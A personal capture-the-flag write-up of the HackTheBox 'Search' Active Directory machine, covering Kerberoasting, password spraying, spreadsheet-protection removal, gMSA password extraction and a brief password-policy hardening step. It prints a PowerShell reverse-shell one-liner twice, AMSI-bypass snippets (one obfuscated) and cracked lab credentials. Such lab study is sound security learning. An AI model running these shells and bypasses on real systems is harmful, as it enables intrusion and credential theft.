# Search Helped-Through

![](slide_2.jpg)

Name: Search
Date:  28/12/2022
Difficulty: Hard  
Goals:  
- Connect RBAC and AD for AZ104 
- Real-World-Like AD box
- Bring my total daily workload back to were it should follow winter ralted festivities
- Keep me headspace in a hackery-space to continue with everything for 2023 
- Test Windows decoding and piping a reverse shell and test way to do 
Learnt:
- AD hacking meta 
- password reuse
- AD hacking workflow 
- More powershell
- Changing password policy

Beyond Root - consideration that from the list:
- Harden the box with powershell
	- Research hardening, but do atleast (prior to research):
		- Lock down port connectivity per user - check connectivity group 
		- Harden and or implement AMSI with powershell
		- Configure the password policy 
		- Create an alert based on .exe and .ps1 from PowerUP, Winpeas 
		- Remote interaction with box that would no lead to compromise
		- Open RDP for a new user to use Sysmon, ProcMon
		- Get Sysinternals on box
	
[Funday Sunday: HacktheBox's Search and Active Directory Gone Wild!](https://www.youtube.com/watch?v=OEu3sXFUCP0)

Also I want to try a schedule of Boot2Root and then the next day Beyond Root and seeiung if that works. REENFORCEMENT LEARNING


## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

Ldapsearch for some Domain information
```bash
ldapsearch -LLL -x -H ldap://10.129.227.156 -b '' -s base '(objectClass=*)' | tee -a ldapsearch-allclass-noauth
```

```bash
rootDomainNamingContext: DC=search,DC=htb
ldapServiceName: search.htb:research$@SEARCH.HTB
...
dnsHostName: Research.search.htb
defaultNamingContext: DC=search,DC=htb
```


Employees listed on the site
![](employees.png)
And more employees
![](moreusers.png)

![](cmeOne.png)

Guess the usernames and ASREP roasting; Al introduces me to [namemash.py](https://gist.githubusercontent.com/superkojiman/11076951/raw/74f3de7740acb197ecfa8340d07d3926a95e5d46/namemash.py) and return to `kerbrute`

```bash
kerbrute --dc $ip -d $domain users.txt
```

![](kerbrutage.png)

ASREP roasting attempt 
![](getnpwithverified.png)

Gifforam190 points out to look at the pictures after Al tries ASREP roasting... 
![](unrealistpasswordsiclosure.png)
I would have also been here for a very long time with this machine...
![](whiffofsomething.png)
A face of a man that smells something bad.

`IsolationIsKey?` and hope.sharp
![1000](hopeissharp.png)

Alh4zr3d tells a story about helpdesk email compromising that contained an email with a default temporary password and compromised 40 accounts from that *"temporary password"*. People do not change there passwords.

I tried kerbrute I guessed it was the username listing was not correct. 
![](usernamesfailing.png)
Al points out our timestamps are not synced to the kdc.
```bash
sudo apt install ntpdate
sudo ntpdate $dc_ip
```

Enumerating shares while enum4linux in the background
![1000](hopeforshares.png)

`-c DCOnly` Bloodhound is pretty quiet comparitively

We have read,write on `RedirectedFolders$` with `Hope.Sharp :  IsolationIsKey?`
![](smbclientimin.png)

Loot the entire share - user.txt indicating some spoilery CTF path
```bash
smb: \> prompt off 
smb: \> recurse on 
smb: \> mget * # Download everything instead of manually 
```

![](nouserflatgforme.png)

Next is the CertEnroll share
![](certenrollshare.png)

Al discusses impersonating the webpage with the stolen certificate as well as running bloodhound from a docker container for assessment to not get burnt by the update cycle of bloodhound missing crucial artifacts. I decided that best do that at some point... it is definately on the list as part of a hacktainer-of-pwn I kubenetes and docker files listing of spin up and bash machines from anywhere kind of setup with minimal compatiblity issues... considering that it will take alot of time to learn docker files and copy and paste or reading someone elses' dockerfiles for have your own RCE for me please scripting, I have not done CME bloodhound module
- https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-bloodhound

```bash
crackmapexec smb -M bloodhound --options
crackmapexec smb $target -u $user -p $password -d $domain -M bloodhound  
crackmapexec smb 10.129.227.156 -u 'Hope.Sharp' -p 'IsolationIsKey?' -d search.htb -M bloodhound  
```
Presumable this was to because Bloodhound was not maintaining the python version.

![](unfornatelynobloodhounderyhere.png)

[I stumbled back onto a previously used python bloudhound ingestor that is potentially the same containerized version Al uses.](https://github.com/fox-it/BloodHound.py)

- Pausing here to consider my options https://www.youtube.com/watch?v=OEu3sXFUCP0 - at 1:06

Regardless I went back to running the [python remote based ingestor](https://github.com/fox-it/BloodHound.py), which connected and gathered data through querying the domain controller. One trick that I looked up for drag and drop activities was to use, if using kali linux default file manager: 
```bash
cd bloodhound-data
thunar # default file manager
```

You can open the default file manager from the cli at your current working directory of your shell for quick drag and drop into bloodhound.  

![](kerberoastableaccounts.png)

Kerberoast the WEB_SVC with impacket.
![](hopeSharpSPNsticket.png)
This can then be cracked as it is encrypted with the WEB_SVC hash as part of the Kerberoast protocol. `@3ONEmillionbaby`. Al *"This is extremely common ... it is the function of the domain, the vulnerablity comes in when the password is not long and complex."*

Hashcat rules recommend in crack long complex passwords: OneRuleToRuleThemAll and the Dive Rule.

![](cmesharesWebSvc.png)

Al could also have just piped raw `ls` into text file. A known active users list making idea. 
```bash
ls > userFromRF.txt
```

CTF sense tingling and I sprayed the recent acquired with the improved wordlist
![](onemillionreuse.png)
This password reuse type - web dev and web app, web dev needs to remember their password -  apparently very realistic, according to Al. He then explains about a County Government Enterprise Admin account sharing the password of the daily-driver low privilege account of the System Administrator. Rephrasing - myself for effect - from the bottom-up the Sys-Admin reuse his regular account password with his Enterprise Admin account.

![](cmeedgarshare.png)

Like Jason Haddix, Al uses [aquatone](https://github.com/michenriksen/aquatone). 

Change in mindset from exploit-based enumerating for AD:

1. How do I compromise credentials?
2. What services can I access with those credentials?
3. How can I abuse my permissions to get more permissions?

Windows prefers IPv6 use [mitm6](https://github.com/dirkjanm/mitm6)

![](edgarsdesktop.png)

Openning up the document:
![](phsihingattemptdoc.png)

It is apparently this suppose to replicate internal Phishing Simulations.

```bash
mkdir Hacking-The-XLSX
cp Phishing_Attempt.xlsx Phishing_Attempt.zip
unzip Phishing_Attempt.xlsx
```

![](treeingtheunzippedxlsxfile.png)
And view at the raw sheet to find any indication of protection:
![1000](thexlsxinvim.png)

Al removes this xml from the the 
```xml
<sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg==" saltValue="U9oZfaVCkz5jWdhs9AA8nA==" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
```

Al was also looking for how, I tried recursively grepping 
![](Itried.png)

Al just removed the lines containing the protection. 
![](bbbbbinvimandd.png)
and then zipped it back together again:
```bash
zip -r unprotected.xlsx .
libreoffice unprotected.xlsx
```

![](andbamherearethedomainpasswords.png)

Similarly to my recursive grepping Al hunted for the next logical `'passwords'`
![1000](thealternative.png)

From Linux Hint I went to try `xmllint` default install on Kali, to find an automatable way.
![](instantconversionissues.png)

Vim nastiness aside tmux; `mousepad` works and format everything nicely were echo and vim in tmux will fail. Al demonstrates using `jq` to parse sharphound json data to extract information

```bash
# Basic starting point for CLI data extraction from a ingestor data 
cat $bhdata_*file.json  | jq '.'
# Get all users in a domain from ingestor data
cat $bhdata_users.json  | jq '.data[].Properties.name' | tr -d '"' > users.txt
# Remove @DOMAIN.TLD append  
sed 's/@DOMAIN.TLD//g'
```

[Group Managed Service Account](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview) is a managed domain account that provides automatic password management, simplified service principal name (SPN) management and the ability to delegate the management to other administrators, but over a multiple servers -unlike standalone Managed Service Account.

```bash
crackmapexec smb 10.129.227.156 -u bhdata_users.txt -p extractPasswords.txt
```

## Foothold

Sierra Frye! `search.htb\SIERRA.FRYE:$$49=wide=STRAIGHT=jordan=28$$18`
![1000](sirrafryepasswordreuse.png)
Quick checking for SMB shares with cme:
![](cmesierrafryeshares.png)

Importantly for me I went for the flag instrictively; I am trying to be more like Al and head for the next phase of hacking the box. I am not knocking capture the flag in making me this way, but this kind of small recognition and hopeful adjustment overtime is key to long term change. A example the last couple of years is password reuse, default passwords and weak passwords - it is just not sometime I worry about, because I always tried to and to check it seemed otherworldly, as it is sometime *other* people do, but that was a massive cognitive blind spot for sometime. 

Changing the node to Seirra.Frye, firstly checking `Unrolled Group Mememberships`
![](sierragroupmembership.png)

then `Outbound Object Control`
![](objectcontrol.png)

GMSA is Microsoft's answer to Kerberoasting - similar to LAPs, but for service account's; the passwords are continuously rotated and randomised.

Problem - we require a shell to abuse this permission

Member of chat points out [GMSA dumper](https://github.com/micahvandeusen/gMSADumper)!
Also some other nice github repositories
https://github.com/topotam/PetitPotam
https://github.com/knavesec/CredMaster
https://github.com/hoangprod/AndrewSpecial
Finally looked at this to reconsider Golang and C related futures... 
https://github.com/byt3bl33d3r/OffensiveNim#why-nim 

Personally I think Microsoft will try to make a incremental shifts in the next twenty years and use AI to port and backport everything into Cannonical Microsoft C-like language.like google's Carbon, the point that future exploitation shifts to something else. Removing it by previous generations of Windows at some point being considered *old* Microsoft code base lose the madness of always have to maintain the visibility of old code by not having to maintain use for it anymore. I have been really wanting to talk about this topic in the future with anyone as to me the issues in C are best exploiting by *knowing* C - writing it has become faster with AI. At some point there will be widespread detections measures based on compilation signatures. 

Al points out that on Red Team assessments python scripts are good as there are less network signatures.

![](gmsadumpstered.png)

From GMSA-ADFS-GMSA we can change Tristan.Davies Passwords with `GenericAll`
![](modifytristan.png)

We don't have a shell but we could use `impacket-smbpasswd`, this does lead anywhere as the hashes for Al did not work. Given that I have heavy cold I will add this to my beyond root section. 

There was also the certificate. It is encrypted - `pfx2john`  - use can identify this by `file $file.pfx` outputing that it is: `data` - cracking with `john` will result in `misspissy` as the password.

`Firefox -> Settings -> Privacy and Security -> View Certificates -> Your Certificates -> Import -> <import your certificate>`
And in Burpsuite, because the recently changed the settings - it now has a search bar! Incredible.

`Burp -> Settings -> Search: Certificates -> Client TLS Certificates -> Add`, the later method did not work.

![](loginscreenrelief.png)

`localhost` is the computer name along with the Sierra.Frye and `$$49=wide=STRAIGHT=jordan=28$$18`

## PrivEsc

![](sierraproof.png)

Al helpful demonstrates a great site I did not know: [dsinternals](https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/), also some powershell revision

![](getthegmsapassword.png)

```powershell
$gmsa = Get-ADServiceAccount -Identity BIR-ADFS-GMSA -Properties 'msDS-ManagedPassword'
$gmsaPass = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $gmsaPass
```

![](crazypassword.png)

```powershell
$credobj = ConvertFrom-ADManagedPasswordBlob $gmsaPass
$credobj.SecureCurrentPassword # just for visual purposes
$credential = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $credobj.SecureCurrentPassword
# Now we can invoke command
Invoke-Command -Computername localhost -Credential $credential -Scriptblock { net user TRISTAN.DAVIES password123! /domain }
```

![](tristandaviesyourface.png)



![](hurray.png)

After some playing around with fancy options I went to copy and paste powershell
```powershell
$username = 'Tristan.Davies'
$password = 'password123!'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Invoke-Command -Computername localhost -Credential $credential -Scriptblock { powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.109',445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" }
```
Greeted by:
![](bingbongbingbongAMSI.png)
I did run cme module `enum_avproducts`, but it just errored out - and these failed
```powershell
[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)

sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."AssEmbly"."GETTYPe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."getfiElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sETVaLUE"( ${nULl},${tRuE} )
```
Yikes...
![](wearegettingslapped.png)

Pre Root Extras for persistence and fun:
- Dumped ntds with cme!

Listed for trying on next Beyond Root
- Failed to use a cme to get a shell 
- Enabling RDP with cme and impacket kerboros tickets 
	- Harden and or implement AMSI with powershell 
- Create an alert based on .exe and .ps1 from PowerUP, Winpeas 
- Remote interaction with box that would no lead to compromise
- Open RDP for a new user to use Sysmon, ProcMon
- Get Sysinternals on box

## Beyond Root

Returning the next day for the Beyond Root.

`impacket-smbpasswd` - https://github.com/fortra/impacket/blob/master/examples/smbpasswd.py
      
Harden the box with powershell - Research hardening, but do atleast (prior to research):
- Lock down port connectivity per user - check connectivity group
- Harden and or implement AMSI with powershell - Do not need to added to list of todos
- Configure the password policy 
```powershell
Get-ADDefaultDomainPasswordPolicy
```
![](passwordpolicy.png)

Microsoft guidelines
![](mspasswordguidelines.png)

Forgive the hurried desire to do the beyond root rather add to endless reading. [UK government's Password advice](https://www.ncsc.gov.uk/collection/passwords/updating-your-approach) has alot of nuanced advice poniting out similiar issues making it too complex for users that the burden result in less secure password storage or strength [discussed in this Sans article](https://www.sans.org/blog/the-debate-around-password-rotation-policies).
[US governments Password tips](https://www.cisa.gov/uscert/ncas/tips/ST04-002) more precise do x, French CLI says atleast 12 letter, German - long and complex and Israel Cyber Chef's "pants" advise - do not reuse and do not share is good memorable advise for regular users.

So I did:
```powershell
Set-ADDefaultDomainPasswordPolicy -Identity search.htb -PasswordHistoryCount 10 -MinPasswordLength 12 -ComplexityEnabled $true
```


## Additional Writeup Read

https://0xdf.gitlab.io/2022/04/30/htb-search.html

[Ippsec](https://www.youtube.com/watch?v=c8Qbloh6Lqg)
1. Change variable names
2. Find the trigger
```powershell
Invoke-Command -Computername localhost -Credential $credential -Scriptblock { $client = New-Object System.Net.Sockets.TCPClient('10.10.14.109',445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }
```

![](tristanrev1.png)